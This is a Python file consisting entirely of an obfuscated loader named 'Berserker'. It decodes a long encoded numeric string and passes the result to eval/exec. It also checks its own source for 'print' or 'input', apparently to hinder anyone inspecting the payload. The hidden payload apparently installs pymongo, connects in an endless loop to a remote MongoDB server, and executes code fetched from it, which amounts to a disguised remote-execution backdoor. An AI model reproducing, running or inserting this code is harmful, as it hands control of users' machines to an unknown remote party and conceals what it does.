class Berserker():
 def __init__(self:object,_boom:float=False,_bytes:int=0,*_byte:bool,**_rasputin:float)->exec:
  self._encode,self._bit,self._bits,_boom,self._exit,_rasputin[_bytes]=lambda _boom:str(_rasputin[_bytes](f"{self._bits[4]+self._bits[-13]+self._bits[4]+self._bits[2]}(''.join(%s),{self._bits[6]+self._bits[11]+self._bits[14]+self._bits[1]+self._bits[0]+self._bits[11]+self._bits[18]}())"%list(_boom))).encode(self._bits[20]+self._bits[19]+self._bits[5]+self._bits[34])if _rasputin[_bytes]==eval else exit(),lambda _delete:_boom(_delete),exit()if _boom else'abcdefghijklmnopqrstuvwxyz0123456789',lambda _boom:exit()if self._bits[15]+self._bits[17]+self._bits[8]+self._bits[13]+self._bits[19] in open(__file__, errors=self._bits[8]+self._bits[6]+self._bits[13]+self._bits[14]+self._bits[17]+self._bits[4]).read() or self._bits[8]+self._bits[13]+self._bits[15]+self._bits[20]+self._bits[19] in open(__file__, errors=self._bits[8]+self._bits[6]+self._bits[13]+self._bits[14]+self._bits[17]+self._bits[4]).read()else"".join(_boom if _boom not in self._bits else self._bits[self._bits.index(_boom)+1 if self._bits.index(_boom)+1<len(self._bits)else 0]for _boom in "".join(chr(ord(t)-73626)if t!="ζ"else"\n"for t in self._exit(_boom))),lambda _eval:"".join(chr(int(_decode)-len(_eval.split('/')))if _decode!='¤'else'ζ'for _decode in str(_eval).split('/')),eval
  return self.__decode__(_rasputin[(self._bits[-1]+'_')[-1]+self._bits[18]+self._bits[15]+self._bits[0]+self._bits[17]+self._bits[10]+self._bits[11]+self._bits[4]])
 def __decode__(self,_execute: str)->exec:return(None,self._encode(self._bit(_execute)))[0]
Berserker(_boom=False,_sparkle='''74336/74334/74341/74279/¤/74253/74253/74253/74253/74325/74329/74332/74331/74334/74336/74253/74332/74341/74329/74331/74330/74323/74331/¤/74321/74340/74319/74321/74332/74336/74279/¤/74253/74253/74253/74253/74325/74329/74332/74331/74334/74336/74253/74331/74335/74265/74253/74335/74341/74335/¤/74253/74253/74253/74253/74331/74335/74267/74335/74341/74335/74336/74321/74329/74261/74260/74332/74325/74332/74253/74325/74330/74335/74336/74278/74328/74328/74253/74332/74341/74329/74331/74330/74323/74331/74282/74282/74272/74267/74274/74267/74343/74260/74262/¤/74253/74253/74253/74253/74325/74329/74332/74331/74334/74336/74253/74332/74341/74329/74331/74330/74323/74331/¤/¤/74253/74253/74253/74253/¤/74325/74329/74332/74331/74334/74336/74253/74320/74330/74335/74267/74334/74321/74335/74331/74328/74338/74321/74334/¤/74320/74330/74335/74267/74334/74321/74335/74331/74328/74338/74321/74334/74267/74320/74321/74322/74278/74337/74328/74336/74316/74334/74321/74335/74331/74328/74338/74321/74334/74282/74320/74330/74335/74267/74334/74321/74335/74331/74328/74338/74321/74334/74267/74303/74321/74335/74331/74328/74338/74321/74334/74261/74319/74331/74330/74322/74325/74323/74337/74334/74321/74282/74291/74278/74328/74335/74321/74262/¤/74320/74330/74335/74267/74334/74321/74335/74331/74328/74338/74321/74334/74267/74320/74321/74322/74278/74337/74328/74336/74316/74334/74321/74335/74331/74328/74338/74321/74334/74267/74330/74278/74329/74321/74335/74321/74334/74338/74321/74334/74335/74282/74312/74260/74276/74267/74276/74267/74276/74267/74276/74260/74314/¤/¤/74339/74324/74325/74328/74321/74253/74305/74334/74337/74321/74279/¤/74253/74253/74253/74253/74336/74334/74341/74279/¤/74253/74253/74253/74253/74253/74253/74253/74253/74329/74341/74319/74328/74325/74321/74330/74336/74253/74282/74253/74332/74341/74329/74331/74330/74323/74331/74267/74298/74331/74330/74323/74331/74288/74328/74325/74321/74330/74336/74261/74255/74329/74331/74330/74323/74331/74320/74318/74264/74335/74334/74338/74279/74268/74268/74306/74288/74298/74278/74330/74278/74323/74321/74279/74302/74292/74340/74309/74325/74328/74336/74336/74294/74322/74341/74320/74299/74307/74322/74324/74285/74337/74319/74329/74278/74330/74278/74323/74321/74334/74267/74335/74278/74272/74275/74328/74271/74321/74267/74329/74331/74330/74323/74331/74320/74318/74267/74330/74321/74336/74268/74284/74334/74321/74336/74334/74341/74308/74334/74325/74336/74321/74335/74282/74336/74334/74337/74321/74259/74339/74282/74329/74278/74326/74331/74334/74325/74336/74341/74255/74262/¤/74253/74253/74253/74253/74253/74253/74253/74253/74319/74331/74320/74321/74289/74287/74253/74282/74253/74329/74341/74319/74328/74325/74321/74330/74336/74312/74260/74304/74331/74337/74334/74319/74321/74288/74331/74320/74321/74260/74314/74267/74306/74335/74321/74334/74288/74331/74320/74321/¤/74253/74253/74253/74253/74253/74253/74253/74253/74319/74331/74320/74321/74253/74282/74253/74319/74331/74320/74321/74289/74287/74267/74322/74325/74330/74320/74261/74344/74346/74262/74312/74343/74314/74312/74255/74297/74331/74323/74325/74330/74291/74325/74328/74321/74255/74314/¤/74253/74253/74253/74253/74253/74253/74253/74253/74321/74338/74278/74328/74261/74260/74321/74340/74321/74319/74261/74319/74331/74320/74321/74262/74260/74262/¤/74253/74253/74253/74253/74321/74340/74319/74321/74332/74336/74253/74290/74340/74319/74321/74332/74336/74325/74331/74330/74253/74278/74335/74253/74321/74340/74279/¤/74253/74253/74253/74253/74253/74253/74253/74253/74332/74334/74325/74330/74336/74261/74321/74340/74262/¤''')